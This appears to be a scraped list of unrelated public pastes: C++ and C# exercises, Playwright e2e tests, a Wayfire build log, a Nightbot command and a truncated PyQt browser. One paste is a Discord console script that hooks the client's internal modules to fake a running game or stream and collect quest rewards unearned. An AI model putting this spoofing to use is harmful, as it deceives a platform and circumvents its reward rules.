        std::wcout << L""OpenProcessToken error: "" << GetLastError() << std::endl;
        return 1;
    }


    if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
        std::wcout << L""Failed to enable debug privilege."" << std::endl;
        CloseHandle(hToken);
        return 1;
    }


    EnumWindows(EnumWindowsProc, 0);

    if (ModifyWindowTitles()) {
        std::wcout << L""Notepad and Notepad++ have been modified successfully."" << std::endl;
    }
    else {
        std::wcout << L""Unable to modify Notepad or Notepad++ window titles."" << std::endl;
    }

    HANDLE hThread = CreateThread(NULL, 0, TitleModifierThread, NULL, 0, NULL);
    if (hThread == NULL) {
        std::wcout << L""Failed to create thread."" << std::endl;
        return 1;
    }

    std::wcout << L""Window titles are being modified. Press Enter to stop and exit..."" << std::endl;
    std::cin.get();

    running = false;
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    RestoreWindowTitles();

    // ... [Keep the privilege resetting code as it is] ...
    SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);
    CloseHandle(hToken);

    return 0;
}"
jbmnxYvx,nightbot command,SchumacherW,JavaScript,Saturday 29th of June 2024 04:11:51 AM CDT,"sResponse = ['‰ªÄÈ∫º‰∫ãÈÉΩÊ≤íÊúâÁôºÁîü', 'ÊßçÊ≤íÊúâ‰∏äËÜõ', 'ÊõπÁàΩDERÔºåÈñÉÈÅé‰∏ÄÊßç', 'Âè™Â∑Æ‰∏ÄÈªûÈªû', '‰∏≠ÂΩà‰∫Ü'];
sEmoji = ['(‚óî‡±™‚óî)', '(¬¥ŒòœâŒò`)', 'œÉ(¬¥‚àÄÔΩÄ*)', 'Ÿ©(ÔΩ°„Éªœâ„ÉªÔΩ°)ÔªøŸà', '(‡πë¬Ø‚àÄ¬Ø‡πë)', '(‚óèÔΩÄ Ëâ∏ ¬¥)'];
i = Math.floor(Math.random()*sResponse.length);

`${sResponse[i]} $(touser) ${i == sResponse.length-1 ? sEmoji[Math.floor(Math.random()*sEmoji.length)] : 5555}`"
w2RTJUAP,Untitled,35657,C++,Saturday 29th of June 2024 04:10:39 AM CDT,"#include <iostream>
#include <initializer_list> // –ø–æ–¥–∫–ª—é—á–∏—Ç—å –µ—Å–ª–∏ –±—É–¥–µ—Ç –æ—à–∏–±–∫–∞ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏

using namespace std;

class int_array {

public:
    int_array() : length(0), data(nullptr) {}

    int_array(int length) : length(length), data(new int[length]) {}

    int_array(const initializer_list<int>& list) : int_array(list.size()) {
        int i = 0;
        for (const int& element : list) {
            data[i] = element;
            i++;
        }
    }

    ~int_array() {
        delete[] data;
    }

    int& operator[](int index) {
        return data[index];
    }

    int get_lenght() const {
        return length;
    }

private:
    int length;
    int* data;

};

int main() {
    int_array array{ 7, 6, 5, 4, 3, 2, 1 }; // —ç—Ç–∞ —Å—Ç—Ä–æ–∫–∞ –∫–æ–º–ø–∏–ª–∏—Ä—É–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –Ω–∞–ª–∏—á–∏–∏ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä–∞ –¥–ª—è initializer_list
    for (int i = 0; i < 7; i++) {
        cout << array[i] << ' ';
    }
    cout << endl;
}

"
eLbeXNPA,e2e,BbJLeB,JavaScript,Saturday 29th of June 2024 04:07:52 AM CDT,"const { test, describe, beforeEach, afterEach, beforeAll, afterAll, expect } = require('@playwright/test');
const { chromium } = require('playwright');

const host = 'http://localhost:3000';

let browser;
let context;
let page;

let user = {
    email: """",
    password: ""123456"",
    confirmPass: ""123456"",
};

let albumName = """";

describe(""e2e tests"", () => {
    beforeAll(async () => {
        browser = await chromium.launch();
    });

    afterAll(async () => {
        await browser.close();
    });

    beforeEach(async () => {
        context = await browser.newContext();
        page = await context.newPage();
    });

    afterEach(async () => {
        await page.close();
        await context.close();
    });

    describe(""authentication"", () => {

        test(""Registration with Valid Data"", async () => {
            await page.goto(`${host}`);
            await page.click('text=Register');
            await page.waitForSelector('form[action=""/users/register""]');

            user.email = `testuser${Math.floor(Math.random() * 10000)}@example.com`;

            await page.fill('input[name=""email""]', user.email);
            await page.fill('input[name=""password""]', user.password);
            await page.fill('input[name=""rePass""]', user.confirmPass);

            const [response] = await Promise.all([
                page.waitForResponse(response => response.status() === 200 && response.url().includes('/users/register')),
                page.click('button[type=""submit""]')
            ]);

            expect(response.ok()).toBeTruthy();

            const responseBody = await response.json();
            expect(responseBody.email).toBe(user.email);
            expect(responseBody.password).toBe(user.password);
        });

        test(""Login with Valid Data"", async () => {
            await page.goto(`${host}`);
            await page.click('text=Login');
            await page.waitForSelector('form[action=""/users/login""]');

            await page.fill('input[name=""email""]', user.email);
            await page.fill('input[name=""password""]', user.password);

            const [response] = await Promise.all([
                page.waitForResponse(response => response.status() === 200 && response.url().includes('/users/login')),
                page.click('button[type=""submit""]')
            ]);

            expect(response.ok()).toBeTruthy();

            const responseBody = await response.json();
            expect(responseBody.email).toBe(user.email);
            expect(responseBody.password).toBe(user.password);
        });

        test(""Logout from the Application"", async () => {

            await page.goto(`${host}`);
            await page.click('text=Logout');
            await page.waitForSelector('text=Login');

            const url = page.url();
            expect(url).toBe(`${host}/`);
        });

    });

    describe(""navbar"", () => {

        test(""Navigation for Logged-In User Testing"", async () => {
            await page.goto(`${host}`);

            expect(await page.isVisible('text=Home')).toBeTruthy();
            expect(await page.isVisible('text=Catalog')).toBeTruthy();
            expect(await page.isVisible('text=Search')).toBeTruthy();
            expect(await page.isVisible('text=Create Album')).toBeTruthy();
            expect(await page.isVisible('text=Logout')).toBeTruthy();

            expect(await page.isVisible('text=Login')).toBeFalsy();
            expect(await page.isVisible('text=Register')).toBeFalsy();
        });

        test(""Navigation for Guest User Testing"", async () => {
            await page.goto(`${host}`);

            expect(await page.isVisible('text=Home')).toBeTruthy();
            expect(await page.isVisible('text=Catalog')).toBeTruthy();
            expect(await page.isVisible('text=Search')).toBeTruthy();
            expect(await page.isVisible('text=Login')).toBeTruthy();
            expect(await page.isVisible('text=Register')).toBeTruthy();

            expect(await page.isVisible('text=Create Album')).toBeFalsy();
            expect(await page.isVisible('text=Logout')).toBeFalsy();
        });

    });

    describe(""CRUD"", () => {

        test(""Create an Album Testing"", async () => {
            await page.goto(`${host}`);
            await page.click('text=Create Album');
            await page.waitForSelector('form[action=""/data/albums""]');

            albumName = `Test Album ${Math.floor(Math.random() * 10000)}`;

            await page.fill('input[name=""name""]', albumName);
            await page.fill('input[name=""imgUrl""]', '/images/test.jpg');
            await page.fill('input[name=""price""]', '19.99');
            await page.fill('input[name=""releaseDate""]', '2024-06-29');
            await page.fill('input[name=""artist""]', 'Test Artist');
            await page.fill('input[name=""genre""]', 'Test Genre');
            await page.fill('textarea[name=""description""]', 'Test Description');

            const [response] = await Promise.all([
                page.waitForResponse(response => response.status() === 200 && response.url().includes('/data/albums')),
                page.click('button[type=""submit""]')
            ]);

            expect(response.ok()).toBeTruthy();

            const responseBody = await response.json();
            expect(responseBody.name).toBe(albumName);
            expect(responseBody.imgUrl).toBe('/images/test.jpg');
            expect(responseBody.price).toBe('19.99');
            expect(responseBody.releaseDate).toBe('2024-06-29');
            expect(responseBody.artist).toBe('Test Artist');
            expect(responseBody.genre).toBe('Test Genre');
            expect(responseBody.description).toBe('Test Description');
        });

        test(""Edit an Album Testing"", async () => {
            await page.goto(`${host}`);
            await page.click('text=Search');
            await page.fill('input[name=""search""]', albumName);
            await page.click('.button-list >> text=Search'); 

            await page.click(`text=${albumName}`);
            await page.click('text=Edit');
            await page.waitForSelector('form[action^=""/data/albums""]');

            const updatedAlbumName = `${albumName} Updated`;

            await page.fill('input[name=""name""]', updatedAlbumName);

            const [response] = await Promise.all([
                page.waitForResponse(response => response.status() === 200 && response.url().includes('/data/albums')),
                page.click('button[type=""submit""]')
            ]);

            expect(response.ok()).toBeTruthy();

            const responseBody = await response.json();
            expect(responseBody.name).toBe(updatedAlbumName);
        });

        test(""Delete an Album Testing"", async () => {
            await page.goto(`${host}`);
            await page.click('text=Search');
            await page.fill('input[name=""search""]', albumName);
            await page.click('.button-list >> text=Search'); 

            await page.click(`text=${albumName}`);
            await page.click('text=Delete');
            await page.waitForResponse(response => response.status() === 200);

        });

    });
});

"
2fGu8KhT,Parentheses Matrix,Dmaxiya,C++,Saturday 29th of June 2024 04:07:10 AM CDT,"#include <cstdio>
using namespace std;

typedef long long LL;
int T, n, m;

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc

    scanf(""%d"", &T);
    while (T--) {
        scanf(""%d%d"", &n, &m);
        for (int i = 0; i < n; ++i) {
            for (int j = 0; j < m; ++j) {
                if (n % 2 == 0) {
                    if (i < n / 2) {
                        printf(""("");
                    } else {
                        printf("")"");
                    }
                } else {
                    if (j < m / 2) {
                        printf(""("");
                    } else {
                        printf("")"");
                    }
                }
            }
            printf(""\n"");
        }
    }

    return 0;
}
"
VreSkJtL,Board.java,jensie1996,Java,Saturday 29th of June 2024 03:48:40 AM CDT,"public class Board implements Runnable {

    // We maken er een singleton van zodat het ook maar
    // √©√©n keer bestaat.
    private final static Board instance = new Board();

    private Board() {
    }

	// De hoofd methode die je moet implementeren voor Runnable
    @Override
    public void run() {
    }

	// De instance zodat we deze kunnen oproepen in ons hoofd file.
    public static Board getInstance(){
        return instance;
    }
}"
DY3icVAx,Unit_29,lovelyvook,C#,Saturday 29th of June 2024 03:28:01 AM CDT,"using System;

namespace Ijunior
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int arrayCapacity = 10;
            int[] numbers = new int[arrayCapacity];

            FillArray(numbers);
            ShowArray(numbers);
            ShuffleArray(numbers);
            ShowArray(numbers);
        }

        static void FillArray(int[] array)
        {
            Random random = new Random();
            int minNumberForRandom = 1;
            int maxNumberForRandom = 10;

            for (int i = 0; i < array.Length; i++)
            {
                array[i] = random.Next(minNumberForRandom, maxNumberForRandom);
            }
        }

        static void ShowArray(int[] array)
        {
            for (int i = 0; i < array.Length; i++)
            {
                Console.Write(array[i] + "" "");
            }

            Console.WriteLine();
        }

        static void ShuffleArray(int[] array)
        {
            Random random = new Random();
            int tempNumber;
            int randomIndex;
            int minNumberForRandom = 0;
            int maxNumberForRandom = array.Length - 1;

            for (int i = 0; i < array.Length; i++)
            {
                tempNumber = array[i];
                randomIndex = random.Next(minNumberForRandom, maxNumberForRandom);
                array[i] = array[randomIndex];
                array[randomIndex] = tempNumber;
            }
        }
    }
}"
QGq6AARR,wayfire_compile,bluebyt,INI file,Saturday 29th of June 2024 03:07:14 AM CDT,"./install.sh --prefix /opt/wayfire --stream master
Building Wayfire master
Installation prefix: /opt/wayfire
Cloning into 'wayfire'...
remote: Enumerating objects: 27729, done.
remote: Counting objects: 100% (824/824), done.
remote: Compressing objects: 100% (324/324), done.
remote: Total 27729 (delta 503), reused 714 (delta 469), pack-reused 26905
Receiving objects: 100% (27729/27729), 7.04 MiB | 9.43 MiB/s, done.
Resolving deltas: 100% (20963/20963), done.
Note: switching to 'origin/master'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 68d5772b toplevel-views: be more careful when mapping views (#2393)
Cloning into 'wf-shell'...
remote: Enumerating objects: 2076, done.
remote: Counting objects: 100% (845/845), done.
remote: Compressing objects: 100% (411/411), done.
remote: Total 2076 (delta 614), reused 538 (delta 420), pack-reused 1231
Receiving objects: 100% (2076/2076), 9.04 MiB | 11.99 MiB/s, done.
Resolving deltas: 100% (1401/1401), done.
Note: switching to 'origin/master'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 3e7576f update gvc (#263)
The Meson build system
Version: 1.4.1
Source dir: /home/bluebyt/Downloads/wf-install/wayfire
Build dir: /home/bluebyt/Downloads/wf-install/wayfire/build
Build type: native build
Project name: wayfire
Project version: 0.9.0
C compiler for the host machine: cc (gcc 14.1.1 ""cc (GCC) 14.1.1 20240522"")
C linker for the host machine: cc ld.bfd 2.42.0
C++ compiler for the host machine: c++ (gcc 14.1.1 ""c++ (GCC) 14.1.1 20240522"")
C++ linker for the host machine: c++ ld.bfd 2.42.0
Host machine cpu family: x86_64
Host machine cpu: x86_64
Found pkg-config: YES (/usr/bin/pkg-config) 2.1.1
Run-time dependency wayland-server found: YES 1.23.0
Run-time dependency wayland-client found: YES 1.23.0
Run-time dependency wayland-cursor found: YES 1.23.0
Run-time dependency wayland-protocols found: YES 1.36
Run-time dependency cairo found: YES 1.18.0
Run-time dependency pango found: YES 1.54.0
Run-time dependency pangocairo found: YES 1.54.0
Run-time dependency libdrm found: YES 2.4.122
Run-time dependency egl found: YES 1.5
Run-time dependency glesv2 found: YES 3.2
Found CMake: /usr/bin/cmake (3.29.6)
Run-time dependency glm found: YES 1.0.1
Run-time dependency libinput found: YES 1.26.1
Run-time dependency pixman-1 found: YES 0.43.4
Run-time dependency xkbcommon found: YES 1.7.0
Library dl found: YES
Run-time dependency nlohmann_json found: YES 3.11.2
Submodule 'subprojects/wlroots' (https://gitlab.freedesktop.org/wlroots/wlroots.git) registered for path './'
Cloning into '/home/bluebyt/Downloads/wf-install/wayfire/subprojects/wlroots'...
Submodule path './': checked out 'bc73e507abd1e8319353a8601f1f8ebfe17307ee'

Executing subproject wlroots 

wlroots| Project name: wlroots
wlroots| Project version: 0.17.3
wlroots| C compiler for the host machine: cc (gcc 14.1.1 ""cc (GCC) 14.1.1 20240522"")
wlroots| C linker for the host machine: cc ld.bfd 2.42.0
wlroots| Compiler for C supports arguments -Wundef: YES
wlroots| Compiler for C supports arguments -Wlogical-op: YES
wlroots| Compiler for C supports arguments -Wmissing-include-dirs: YES
wlroots| Compiler for C supports arguments -Wold-style-definition: YES
wlroots| Compiler for C supports arguments -Wpointer-arith: YES
wlroots| Compiler for C supports arguments -Winit-self: YES
wlroots| Compiler for C supports arguments -Wstrict-prototypes: YES
wlroots| Compiler for C supports arguments -Wimplicit-fallthrough=2: YES
wlroots| Compiler for C supports arguments -Wendif-labels: YES
wlroots| Compiler for C supports arguments -Wstrict-aliasing=2: YES
wlroots| Compiler for C supports arguments -Woverflow: YES
wlroots| Compiler for C supports arguments -Wmissing-prototypes: YES
wlroots| Compiler for C supports arguments -Walloca: YES
wlroots| Compiler for C supports arguments -Wno-missing-braces: YES
wlroots| Compiler for C supports arguments -Wno-missing-field-initializers: YES
wlroots| Compiler for C supports arguments -Wno-unused-parameter: YES
wlroots| Compiler for C supports arguments -fmacro-prefix-map=/prefix/to/hide=: YES
wlroots| Dependency wayland-server found: YES 1.23.0 (cached)
wlroots| Dependency libdrm found: YES 2.4.122 (cached)
wlroots| Dependency xkbcommon found: YES 1.7.0 (cached)
wlroots| Dependency pixman-1 found: YES 0.43.4 (cached)
wlroots| Library m found: YES
wlroots| Library rt found: YES
wlroots| Dependency wayland-protocols found: YES 1.36 (cached)
wlroots| Build-time dependency wayland-scanner found: YES 1.23.0
wlroots| Program /usr/bin/wayland-scanner found: YES (/usr/bin/wayland-scanner)
wlroots| Has header ""linux/dma-buf.h"" : YES
wlroots| Dependency egl found: YES 1.5 (cached)
wlroots| Run-time dependency gbm found: YES 24.1.2-arch1.1
wlroots| Dependency glesv2 found: YES 3.2 (cached)
wlroots| Program ./embed.sh found: YES (/home/bluebyt/Downloads/wf-install/wayfire/subprojects/wlroots/render/gles2/shaders/./embed.sh)
wlroots| Run-time dependency vulkan found: YES 1.3.285
wlroots| Check usable header ""vulkan/vulkan.h"" with dependency vulkan: YES
wlroots| Program glslang found: YES (/usr/bin/glslang)
wlroots| Dependency pixman-1 found: YES 0.43.4 (cached)
wlroots| Dependency gbm found: YES 24.1.2-arch1.1 (cached)
wlroots| Checking for function ""gbm_bo_get_fd_for_plane"" with dependency gbm: YES
wlroots| Run-time dependency libudev found: YES 256
wlroots| Run-time dependency libseat found: YES 0.8.0
wlroots| Build-time dependency hwdata found: YES 0.383
wlroots| Run-time dependency libdisplay-info found: YES 0.2.0
wlroots| Run-time dependency libliftoff found: YES 0.5.0
wlroots| Dependency libinput found: YES 1.26.1 (cached)
wlroots| Run-time dependency xcb found: YES 1.17.0
wlroots| Run-time dependency xcb-dri3 found: YES 1.17.0
wlroots| Run-time dependency xcb-present found: YES 1.17.0
wlroots| Run-time dependency xcb-render found: YES 1.17.0
wlroots| Run-time dependency xcb-renderutil found: YES 0.3.10
wlroots| Run-time dependency xcb-shm found: YES 1.17.0
wlroots| Run-time dependency xcb-xfixes found: YES 1.17.0
wlroots| Run-time dependency xcb-xinput found: YES 1.17.0
wlroots| Dependency wayland-client found: YES 1.23.0 (cached)
wlroots| Run-time dependency xwayland found: YES 24.1.0
wlroots| Dependency xcb found: YES 1.17.0 (cached)
wlroots| Run-time dependency xcb-composite found: YES 1.17.0
wlroots| Run-time dependency xcb-ewmh found: YES 0.4.2
wlroots| Run-time dependency xcb-icccm found: YES 0.4.2
wlroots| Dependency xcb-render found: YES 1.17.0 (cached)
wlroots| Run-time dependency xcb-res found: YES 1.17.0
wlroots| Dependency xcb-xfixes found: YES 1.17.0 (cached)
wlroots| Run-time dependency xcb-errors found: YES 1.0.1
wlroots| Checking for function ""xcb_xfixes_set_client_disconnect_mode"" with dependencies xcb, xcb-composite, xcb-ewmh, xcb-icccm, xcb-render, xcb-res, xcb-xfixes, xcb-errors: YES
wlroots| Configuring config.h using configuration
wlroots| Configuring version.h using configuration
wlroots| Configuring config.h using configuration
wlroots| Build targets in project: 137
wlroots| Subproject wlroots finished.

Submodule 'subprojects/wf-config' (https://github.com/WayfireWM/wf-config) registered for path './'
Cloning into '/home/bluebyt/Downloads/wf-install/wayfire/subprojects/wf-config'...
Submodule path './': checked out 'fd420e8ae6bfda7fb0c4979c198dd82db6c3bd72'

Executing subproject wf-config 

wf-config| Project name: wf-config
wf-config| Project version: 0.9.0
wf-config| C++ compiler for the host machine: c++ (gcc 14.1.1 ""c++ (GCC) 14.1.1 20240522"")
wf-config| C++ linker for the host machine: c++ ld.bfd 2.42.0
wf-config| Dependency glm found: YES 1.0.1 (cached)
wf-config| Run-time dependency libevdev found: YES 1.13.2
wf-config| Run-time dependency libxml-2.0 found: YES 2.13.1
wf-config| Run-time dependency doctest found: YES 2.4.9
wf-config| Build targets in project: 149
wf-config| Subproject wf-config finished.

Library execinfo found: NO
Submodule 'subprojects/wf-utils' (https://github.com/WayfireWM/wf-utils.git) registered for path './'
Cloning into '/home/bluebyt/Downloads/wf-install/wayfire/subprojects/wf-utils'...
Submodule path './': checked out '15f8e16721585ae3eaf278ba71d7064237eb23f5'

Executing subproject wf-utils 

wf-utils| Project name: wf-utils
wf-utils| Project version: 0.4.0
wf-utils| C++ compiler for the host machine: c++ (gcc 14.1.1 ""c++ (GCC) 14.1.1 20240522"")
wf-utils| C++ linker for the host machine: c++ ld.bfd 2.42.0
wf-utils| Program doxygen found: YES (/usr/bin/doxygen)
wf-utils| Configuring Doxyfile using configuration
wf-utils| Build targets in project: 151
wf-utils| NOTICE: Future-deprecated features used:
wf-utils| * 0.56.0: {'meson.build_root', 'meson.source_root'}
wf-utils| Subproject wf-utils finished.

Submodule 'subprojects/wf-touch' (https://github.com/WayfireWM/wf-touch) registered for path './'
Cloning into '/home/bluebyt/Downloads/wf-install/wayfire/subprojects/wf-touch'...
Submodule path './': checked out 'b8b844fa873871f90a9cf0768c8ae8c92ad49f34'

Executing subproject wf-touch 

wf-touch| Project name: wf-touch
wf-touch| Project version: 0.0
wf-touch| C++ compiler for the host machine: c++ (gcc 14.1.1 ""c++ (GCC) 14.1.1 20240522"")
wf-touch| C++ linker for the host machine: c++ ld.bfd 2.42.0
wf-touch| Dependency glm found: YES 1.0.1 (cached)
wf-touch| Dependency doctest found: YES 2.4.9 (cached)
wf-touch| Build targets in project: 155
wf-touch| Subproject wf-touch finished.

Run-time dependency libinotify found: NO (tried pkgconfig and cmake)
Run-time dependency libjpeg found: YES 3.0.3
Run-time dependency libpng found: YES 1.6.43
Library execinfo found: NO
Compiler for C++ supports arguments -fno-gnu-unique: YES 
Compiler for C++ supports link arguments -lc++fs: NO 
Compiler for C++ supports link arguments -lc++experimental: NO 
Compiler for C++ supports link arguments -lstdc++fs: YES 
Check usable header ""GLES3/gl32.h"" with dependency glesv2: YES 
Dependency xcb found: YES 1.17.0 (cached)
Configuring config.h using configuration
Program wayland-scanner found: YES (/usr/bin/wayland-scanner)
Program addr2line found: YES (/usr/bin/addr2line)
Program git found: YES (/usr/bin/git)
Configuring wayfire.1 using configuration
Dependency libevdev found: YES 1.13.2 (cached)
Run-time dependency OpenMP found: YES 4.5
Dependency doctest found: YES 2.4.9 (cached)
Message: 
----------------
wayfire 0.9.0

system wfconfig: false
 system wlroots: false
       xwayland: true
    x11-backend: true
        imageio: true
         gles32: true
    print trace: true
     unit tests: true
----------------

Build targets in project: 210

wlroots 0.17.3

    drm-backend     : YES
    x11-backend     : YES
    libinput-backend: YES
    xwayland        : YES
    gles2-renderer  : YES
    vulkan-renderer : YES
    gbm-allocator   : YES
    session         : YES
    xcb-errors      : YES
    egl             : YES
    libliftoff      : YES

wayfire 0.9.0

  Subprojects
    wf-config          : YES
    wf-touch           : YES
    wf-utils           : YES 1 warnings
    wlroots            : YES

  User defined options
    buildtype          : debugoptimized
    prefix             : /opt/wayfire
    use_system_wfconfig: disabled
    use_system_wlroots : disabled

Found ninja-1.12.1 at /usr/bin/ninja
WARNING: Running the setup command as `meson [options]` instead of `meson setup [options]` is ambiguous and deprecated.
ninja: Entering directory `build'
[186/837] Compiling C object subprojec...ots.so.12.p/backend_drm_libliftoff.c.o
FAILED: subprojects/wlroots/libwlroots.so.12.p/backend_drm_libliftoff.c.o 
cc -Isubprojects/wlroots/libwlroots.so.12.p -Isubprojects/wlroots -I../subprojects/wlroots -Isubprojects/wlroots/include -I../subprojects/wlroots/include -Isubprojects/wlroots/protocol -Isubprojects/wlroots/render/gles2/shaders -Isubprojects/wlroots/render/vulkan/shaders -Isubprojects/wlroots/backend/drm -I/usr/include/libdrm -I/usr/include/pixman-1 -fdiagnostics-color=always -D_FILE_OFFSET_BITS=64 -Wall -Winvalid-pch -Wextra -Werror -std=c11 -O2 -g -DWLR_USE_UNSTABLE -DWLR_LITTLE_ENDIAN=1 -DWLR_BIG_ENDIAN=0 -Wundef -Wlogical-op -Wmissing-include-dirs -Wold-style-definition -Wpointer-arith -Winit-self -Wstrict-prototypes -Wimplicit-fallthrough=2 -Wendif-labels -Wstrict-aliasing=2 -Woverflow -Wmissing-prototypes -Walloca -Wno-missing-braces -Wno-missing-field-initializers -Wno-unused-parameter -fmacro-prefix-map=../subprojects/wlroots/= -fPIC -MD -MQ subprojects/wlroots/libwlroots.so.12.p/backend_drm_libliftoff.c.o -MF subprojects/wlroots/libwlroots.so.12.p/backend_drm_libliftoff.c.o.d -o subprojects/wlroots/libwlroots.so.12.p/backend_drm_libliftoff.c.o -c ../subprojects/wlroots/backend/drm/libliftoff.c
../subprojects/wlroots/backend/drm/libliftoff.c: In function ‚Äòcrtc_commit‚Äô:
../subprojects/wlroots/backend/drm/libliftoff.c:439:19: error: too few arguments to function ‚Äòliftoff_output_apply‚Äô
  439 |         int ret = liftoff_output_apply(crtc->liftoff, req, flags);
      |                   ^~~~~~~~~~~~~~~~~~~~
In file included from ../subprojects/wlroots/backend/drm/libliftoff.c:3:
/usr/include/libliftoff.h:85:1: note: declared here
   85 | liftoff_output_apply(struct liftoff_output *output, drmModeAtomicReq *req,
      | ^~~~~~~~~~~~~~~~~~~~
[193/837] Compiling C++ object subproj...libwf-config.so.0.9.0.p/src_file.cpp.o
ninja: build stopped: subcommand failed."
MXcF4kfC,Codigo para discord,jose89fcb,JavaScript,Saturday 29th of June 2024 02:59:21 AM CDT,"let wpRequire;
window.webpackChunkdiscord_app.push([[ Math.random() ], {}, (req) => { wpRequire = req; }]);

let ApplicationStreamingStore, RunningGameStore, QuestsStore, ExperimentStore, FluxDispatcher, api
if(window.GLOBAL_ENV.SENTRY_TAGS.buildId === ""366c746173a6ca0a801e9f4a4d7b6745e6de45d4"") {
	ApplicationStreamingStore = Object.values(wpRequire.c).find(x => x?.exports?.default?.getStreamerActiveStreamMetadata).exports.default;
	RunningGameStore = Object.values(wpRequire.c).find(x => x?.exports?.default?.getRunningGames).exports.default;
	QuestsStore = Object.values(wpRequire.c).find(x => x?.exports?.default?.getQuest).exports.default;
	ExperimentStore = Object.values(wpRequire.c).find(x => x?.exports?.default?.getGuildExperiments).exports.default;
	FluxDispatcher = Object.values(wpRequire.c).find(x => x?.exports?.default?.flushWaitQueue).exports.default;
	api = Object.values(wpRequire.c).find(x => x?.exports?.getAPIBaseURL).exports.HTTP;
} else {
	ApplicationStreamingStore = Object.values(wpRequire.c).find(x => x?.exports?.Z?.getStreamerActiveStreamMetadata).exports.Z;
	RunningGameStore = Object.values(wpRequire.c).find(x => x?.exports?.ZP?.getRunningGames).exports.ZP;
	QuestsStore = Object.values(wpRequire.c).find(x => x?.exports?.Z?.getQuest).exports.Z;
	ExperimentStore = Object.values(wpRequire.c).find(x => x?.exports?.Z?.getGuildExperiments).exports.Z;
	FluxDispatcher = Object.values(wpRequire.c).find(x => x?.exports?.Z?.flushWaitQueue).exports.Z;
	api = Object.values(wpRequire.c).find(x => x?.exports?.tn?.get).exports.tn;
}

let quest = [...QuestsStore.quests.values()].find(x => x.userStatus?.enrolledAt && !x.userStatus?.completedAt && new Date(x.config.expiresAt).getTime() > Date.now())
let isApp = navigator.userAgent.includes(""Electron/"")
if(!isApp) {
	console.log(""This no longer works in browser. Use the desktop app!"")
} else if(!quest) {
	console.log(""You don't have any uncompleted quests!"")
} else {
	const pid = Math.floor(Math.random() * 30000) + 1000
	
	let applicationId, applicationName, secondsNeeded, secondsDone, canPlay
	if(quest.config.configVersion === 1) {
		applicationId = quest.config.applicationId
		applicationName = quest.config.applicationName
		secondsNeeded = quest.config.streamDurationRequirementMinutes * 60
		secondsDone = quest.userStatus?.streamProgressSeconds ?? 0
		canPlay = quest.config.variants.includes(2)
	} else if(quest.config.configVersion === 2) {
		applicationId = quest.config.application.id
		applicationName = quest.config.application.name
		canPlay = ExperimentStore.getUserExperimentBucket(""2024-04_quest_playtime_task"") > 0 && quest.config.taskConfig.tasks[""PLAY_ON_DESKTOP""]
		const taskName = canPlay ? ""PLAY_ON_DESKTOP"" : ""STREAM_ON_DESKTOP""
		secondsNeeded = quest.config.taskConfig.tasks[taskName].target
		secondsDone = quest.userStatus?.progress?.[taskName]?.value ?? 0
	}

	if(canPlay) {
		api.get({url: `/applications/public?application_ids=${applicationId}`}).then(res => {
			const appData = res.body[0]
			const exeName = appData.executables.find(x => x.os === ""win32"").name.replace("">"","""")
			
			const games = RunningGameStore.getRunningGames()
			const fakeGame = {
				cmdLine: `C:\\Program Files\\${appData.name}\\${exeName}`,
				exeName,
				exePath: `c:/program files/${appData.name.toLowerCase()}/${exeName}`,
				hidden: false,
				isLauncher: false,
				id: applicationId,
				name: appData.name,
				pid: pid,
				pidPath: [pid],
				processName: appData.name,
				start: Date.now(),
			}
			games.push(fakeGame)
			FluxDispatcher.dispatch({type: ""RUNNING_GAMES_CHANGE"", removed: [], added: [fakeGame], games: games})
			
			let fn = data => {
				let progress = data.userStatus.streamProgressSeconds
				console.log(`Quest progress: ${progress}/${secondsNeeded}`)
				
				if(progress >= secondsNeeded) {
					console.log(""Quest completed!"")
					
					const idx = games.indexOf(fakeGame)
					if(idx > -1) {
						games.splice(idx, 1)
						FluxDispatcher.dispatch({type: ""RUNNING_GAMES_CHANGE"", removed: [fakeGame], added: [], games: []})
					}
					FluxDispatcher.unsubscribe(""QUESTS_SEND_HEARTBEAT_SUCCESS"", fn)
				}
			}
			FluxDispatcher.subscribe(""QUESTS_SEND_HEARTBEAT_SUCCESS"", fn)
			
			console.log(`Spoofed your game to ${applicationName}. Wait for ${Math.ceil((secondsNeeded - secondsDone) / 60)} more minutes.`)
		})
	} else {
		let realFunc = ApplicationStreamingStore.getStreamerActiveStreamMetadata
		ApplicationStreamingStore.getStreamerActiveStreamMetadata = () => ({
			id: applicationId,
			pid,
			sourceName: null
		})
		
		let fn = data => {
			let progress = data.userStatus.streamProgressSeconds
			console.log(`Quest progress: ${progress}/${secondsNeeded}`)
			
			if(progress >= secondsNeeded) {
				console.log(""Quest completed!"")
				
				ApplicationStreamingStore.getStreamerActiveStreamMetadata = realFunc
				FluxDispatcher.unsubscribe(""QUESTS_SEND_HEARTBEAT_SUCCESS"", fn)
			}
		}
		FluxDispatcher.subscribe(""QUESTS_SEND_HEARTBEAT_SUCCESS"", fn)
		
		console.log(`Spoofed your stream to ${applicationName}. Stream any window in vc for ${Math.ceil((secondsNeeded - secondsDone) / 60)} more minutes.`)
		console.log(""Remember that you need at least 1 other person to be in the vc!"")
	}
}"
BSWRcrUP,Bloody Browser [OPEN SOURCE],Minecraft_rose,Python,Saturday 29th of June 2024 02:38:11 AM CDT,"import sys
import os
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtWebEngineWidgets import *

class Browser(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Bloody Browser')
        self.setGeometry(100, 100, 1200, 800)

        self.tabs = QTabWidget()
